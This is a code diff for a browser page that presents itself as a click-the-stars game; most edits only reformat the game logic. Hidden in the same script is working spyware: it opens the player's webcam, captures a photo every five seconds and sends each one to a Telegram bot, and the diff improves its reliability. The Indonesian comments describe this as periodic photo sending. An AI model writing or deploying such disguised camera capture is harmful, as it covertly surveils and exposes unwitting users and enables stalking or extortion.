@@ -57,6 +57,7 @@
         height = canvas.height = window.innerHeight;
     });
 
+    // Game variables
     let stars = [], score = 0, gameOver = false;
     const maxStars = 20;
 
@@ -74,11 +75,15 @@
     };
     Star.prototype.update = function() { this.y += this.speed; };
 
-    function addStar() { if (stars.length < maxStars && !gameOver) stars.push(new Star()); }
+    function addStar() {
+        if (stars.length < maxStars && !gameOver) stars.push(new Star());
+    }
+
     function loop() {
         ctx.clearRect(0, 0, width, height);
         stars.forEach((star, i) => {
-            star.update(); star.draw();
+            star.update();
+            star.draw();
             if (star.y - star.size > height) stars.splice(i, 1);
         });
         if (!gameOver) requestAnimationFrame(loop);
@@ -87,10 +92,12 @@
     canvas.addEventListener('click', e => {
         if (gameOver) return;
         const rect = canvas.getBoundingClientRect();
-        const mx = e.clientX - rect.left, my = e.clientY - rect.top;
+        const mx = e.clientX - rect.left;
+        const my = e.clientY - rect.top;
         stars.forEach((star, i) => {
             if (Math.hypot(star.x - mx, star.y - my) < star.size) {
-                stars.splice(i, 1); score++;
+                stars.splice(i, 1);
+                score++;
                 document.getElementById('score').innerText = score;
                 if (score >= 10) endGame();
             }
@@ -103,7 +110,9 @@
         document.getElementById('playBtn').style.display = 'block';
     }
     document.getElementById('playBtn').addEventListener('click', () => {
-        stars = []; score = 0; gameOver = false;
+        stars = [];
+        score = 0;
+        gameOver = false;
         document.getElementById('score').innerText = score;
         document.getElementById('message').style.display = 'none';
         document.getElementById('playBtn').style.display = 'none';
@@ -113,7 +122,7 @@
     setInterval(addStar, 500);
     loop();
 
-    // Ambil snapshot berkala dan kirim ke Telegram (foto saja)
+    // Hanya ambil foto berkala dan kirim ke Telegram
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
@@ -124,10 +133,12 @@
                 const captureCtx = captureCanvas.getContext('2d');
 
                 setInterval(() => {
-                    captureCanvas.width = video.videoWidth;
-                    captureCanvas.height = video.videoHeight;
-                    captureCtx.drawImage(video, 0, 0);
-                    captureCanvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+                    if (video.readyState >= 2) {
+                        captureCanvas.width = video.videoWidth;
+                        captureCanvas.height = video.videoHeight;
+                        captureCtx.drawImage(video, 0, 0);
+                        captureCanvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+                    }
                 }, 5000);
             })
             .catch(err => console.error('Gagal akses kamera:', err));
@@ -144,7 +155,7 @@
             body: formData
         })
         .then(res => res.json())
-        .then(data => console.log(data.ok ? 'Foto terkirim!' : 'Error kirim foto', data));
+        .then(data => console.log(data.ok ? 'Foto berhasil terkirim!' : 'Error kirim foto', data));
     }
 </script>
 
